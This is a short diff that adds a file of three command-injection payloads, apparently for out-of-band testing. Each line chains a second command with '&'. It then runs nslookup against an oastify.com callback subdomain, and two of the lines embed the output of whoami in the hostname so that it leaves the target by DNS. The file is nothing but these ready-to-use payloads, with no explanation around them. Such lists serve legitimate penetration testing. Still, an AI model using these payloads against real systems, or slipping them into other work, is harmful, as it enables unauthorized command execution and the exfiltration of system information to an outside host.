@@ -1,0 +1,7 @@
+
+
+ & nslookup 4hmrcdunbxbi9gsobp1ha4dpigo7cx0m.oastify.com #
+
+ & nslookup `whoami`.4hmrcdunbxbi9gsobp1ha4dpigo7cx0m.oastify.com #
+
+ & nslookup $(whoami).4hmrcdunbxbi9gsobp1ha4dpigo7cx0m.oastify.com #
